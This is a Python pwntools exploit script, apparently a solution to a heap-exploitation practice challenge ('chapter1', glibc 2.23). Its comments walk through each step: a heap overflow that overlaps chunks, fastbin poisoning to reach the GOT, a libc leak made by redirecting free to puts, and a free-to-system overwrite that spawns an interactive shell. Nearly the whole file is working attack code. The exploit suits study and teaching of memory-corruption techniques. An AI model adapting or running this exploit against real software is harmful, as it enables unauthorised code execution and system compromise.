#!/usr/bin/python3
from pwn import *
e = ELF('chapter1')
def start():
	if args.GDB:
		context.terminal = ['tmux', 'splitw', "-h"]
		return gdb.debug(e.path)
	else:
		return process(e.path)
# no size check on malloc
def malloc(p, size: int, data: bytes):
	p.sendlineafter(b'>>', b'1')
	p.sendlineafter(b':', bytes(str(size), 'utf-8'))
	p.sendlineafter(b':', data)

# index between 0 and 15 inclusive
# no use after free allowed
def edit(p, index: int, data: bytes):
	p.sendlineafter(b'>>', b'2')
	p.sendlineafter(b':', bytes(str(index), 'utf-8'))
	p.sendafter(b':', data)

def free(p, index: int):
	p.sendlineafter(b'>>', b'3')
	p.sendlineafter(b':', bytes(str(index), 'utf-8'))

if __name__=='__main__':
	io = start()
	# no tcache in glibc 2.23
	malloc(io, 104, b'a'*104)
	for i in range(1, 4):
		malloc(io, 104, bytes(chr(ord('a')+i)*24, 'utf-8'))
	# barrier between top chunk and freed chunks
	malloc(io, 104, b'/bin/sh\x00'+b'e'*8)
	# 0   1   2   3   4
	# a | b | c | d | e | top chunk
	# edit has a heap overflow so we can overwrite the size of chunk B to 64
	# and keep prev_in_use bit set
	edit(io, 0, b'a'*104+b'\xe1')
	# 0   1   2   3   4
	# a | b | c | d | e | top chunk
	#   |       |
	#	b
	# c is freed into fastbins
	free(io, 2)
	# fastbins
	# c
	# we then free chunk 1 into unsorted bins
	free(io, 1)
	# result: unsorted bins
	# [b | c] as one chunk
	# =====================
	# find a chunk near puts_got
	# it works since the next byte is 0x7f a valid heap metadata byte
	bss_addr = 0x60209d
	# allocate a chunk z using b | c from the unsorted bins
	# overwrite the next chunk c's size to 112 and next pointer to point to the fake chunk
	malloc(io, 216,b'z'*104 + p64(0x71) + p64(bss_addr))
	# getting write primitive by pointing heap chunk to bss
	'''
	heap
	  0   1      2   3   4
	| a | z  c | d | e | top chunk
	freed
	fastbins
	c -> bss_chunk
	'''
	# this allocates c from the fastbins and fills it with l
	malloc(io, 104, b'l'*24)
	'''
	heap
	  0   1   2   3   4
     	| a | z | l | d | e | top chunk
        freed
	fastbins
	bss_chunk
	'''
	free_got = e.sym.got['free']
	# allocate a new chunk to overwrite the bss(since that is the next fastbin)
	# this overwrites the next pointer to point to free_got
	malloc(io, 104, b'm'*19 + p64(free_got)+p64(free_got+8)+p64(free_got+16))
	#  + p64(free_got-8) + p64(free_got-16))
	puts_plt = e.sym.plt['puts']
	# we allocate a chunk that points to puts
	# so we free(which is know puts) is called on the pointer it
	# gets printed out(we can use this to find libc)
	# replace free_got with puts_plt
	edit(io, 0, p64(puts_plt)[:6])
	# free was overwritten to puts and 1 points to puts_plt
	free(io, 1)
	leak = u64(io.recvline()[1:-1].ljust(8, b'\x00'))
	log.info('Leak @ '+hex(leak))
	# get address of libc and system from libc database
	addr_libc = 0x6f690
	system_libc = 0x45390
	libc = leak - addr_libc
	system = libc + system_libc
	# replace free with system
	edit(io, 2, p64(system)[:6])
	io.sendline(b'2')
	io.clean()
	io.send(b'4')
	log.info("shelled")
	io.interactive()
